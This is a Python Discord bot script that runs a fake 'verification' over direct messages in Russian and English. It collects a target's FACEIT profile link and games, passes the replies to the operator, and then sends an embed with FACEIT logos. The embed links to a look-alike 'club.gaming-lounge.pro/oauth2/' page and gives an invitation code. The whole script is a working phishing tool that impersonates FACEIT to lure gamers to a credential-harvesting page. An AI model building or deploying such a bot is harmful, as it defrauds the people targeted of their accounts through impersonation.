import re
import discord
from discord.ext import commands
import os

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

active_verifications = set()


@bot.event
async def on_ready():
    print(f"Бот {bot.user} готовий!")


@bot.command()
async def start_RU(ctx, member: discord.Member):
    if member.id in active_verifications:
        await ctx.send("Этот пользователь уже проходит верификацию.")
        return
    
    active_verifications.add(member.id)
    try:
        dm = await member.create_dm()
        await dm.send(
            "Привет! 👋 Перед тем как продолжить, нужно пройти небольшую проверку.\n"
            "Ответь, пожалуйста, на пару вопросов для верификации.\n"
            "✉️ Просто отправь любое сообщение, чтобы начать."
        )

        await ctx.send(f"Начал проводить верификацию пользователю: {member}.")

        def check(m):
            return m.author == member and isinstance(m.channel, discord.DMChannel)

        first_message = await bot.wait_for("message", check=check, timeout=300)

        await ctx.send(
            f"Ответ от пользователя {first_message.author} на первый вопрос:: {first_message.content}"
        )

        while True:
            await dm.send(
                "Для продолжения пришли ссылку на твой профиль FACEIT."
            )

            second_answer = await bot.wait_for("message", check=check, timeout=300)
            url = second_answer.content.strip()

            if re.match(r'^https?://(www\.)?faceit\.com(/|$)', url):
                await dm.send(
                    '✅ Спасибо! Ссылка на FACEIT получена.'
                )
                await ctx.send(
                    f"Пользователь {second_answer.author} отправил сообщение: {url}"
                )
                break
            else:
                await dm.send(
                    "❌ Это не действительная ссылка FACEIT. Пожалуйста, попробуй снова."
                )

        await dm.send(
            'Напиши, в какие игры ты играешь на FACEIT (например: CS2, Valorant и другие).'
        )

        third_answer = await bot.wait_for("message", check=check, timeout=300)

        embed = discord.Embed(
            title="✅ Поздравляем!",
            description="[Нажми, чтобы продолжить верификацию](https://club.gaming-lounge.pro/oauth2/)",
            color=discord.Color.dark_orange()
        )
        embed.set_thumbnail(
            url="https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
        )
        embed.set_image(
            url="https://corporate.faceit.com/wp-content/uploads/logo-full-preview-2.png"
        )
        embed.add_field(name="Код приглашения", value="HE39XW")

        await dm.send(embed=embed)

        await ctx.send(
            f"Пользователь {third_answer.author} отправил сообщение: {third_answer.content}"
        )

    except Exception as e:
        await ctx.send(f"Ошибка: {e}")
    finally:
        await ctx.send(
            f"Закончил верификацию пользователя: {member}"
        )
        active_verifications.discard(member.id)

@bot.command()
async def start_EU(ctx, member: discord.Member):
    if member.id in active_verifications:
        await ctx.send("Этот пользователь уже проходит верификацию.")
        return

    active_verifications.add(member.id)
    try:
        dm = await member.create_dm()
        await dm.send(
            "Hi! 👋 Before proceeding, you need to pass a quick verification.\nPlease answer a couple of questions for verification.\n✉️Just send any message to start."
        )

        await ctx.send(f"Начал проводить верификацию пользователю: {member}.")

        def check(m):
            return m.author == member and isinstance(m.channel,
                                                     discord.DMChannel)

        first_message = await bot.wait_for("message", check=check, timeout=300)

        await ctx.send(
            f"Ответ от пользователя {first_message.author} на первый вопрос: {first_message.content}"
        )

        while True:
            await dm.send(
                "To continue, please send the link to your FACEIT profile.")

            second_answer = await bot.wait_for("message",
                                               check=check,
                                               timeout=300)
            url = second_answer.content.strip()

            if re.match(r'^https?://(www\.)?faceit\.com(/|$)', url):
                await dm.send(
                    '✅ Thank you! Your FACEIT link has been received.')
                await ctx.send(
                    f"Ответ от пользователя {second_answer.author} на второй вопрос: {url}"
                )
                break
            else:
                await dm.send(
                    "❌ This is not a valid FACEIT link. Please try again.")

        await dm.send(
            'Please write down which games you play on FACEIT (for example: CS2, Valorant, and others).'
        )

        third_answer = await bot.wait_for("message", check=check, timeout=300)

        embed = discord.Embed(
            title="✅ Congrats!",
            description=
            "[Press to continue verification](https://club.gaming-lounge.pro/oauth2/)",
            color=discord.Color.dark_orange())
        embed.set_thumbnail(
            url=
            "https://corporate.faceit.com/wp-content/uploads/icon-pheasant-preview-2.png"
        )
        embed.set_image(
            url=
            "https://corporate.faceit.com/wp-content/uploads/logo-full-preview-2.png"
        )
        embed.add_field(name="Invintation code", value="HE39XW")

        await dm.send(embed=embed)

        await ctx.send(
            f"Ответ от пользователя {third_answer.author} на третий вопрос: {third_answer.content}"
        )

    except Exception as e:
        await ctx.send(f"Ошибка: {e}")
    finally:
        await ctx.send(
            f"Закончил верификацию пользователя: {member}"
        )
        active_verifications.discard(member.id)


# Твій токен сюди
bot.run(os.getenv('DISCORD_KEY'))
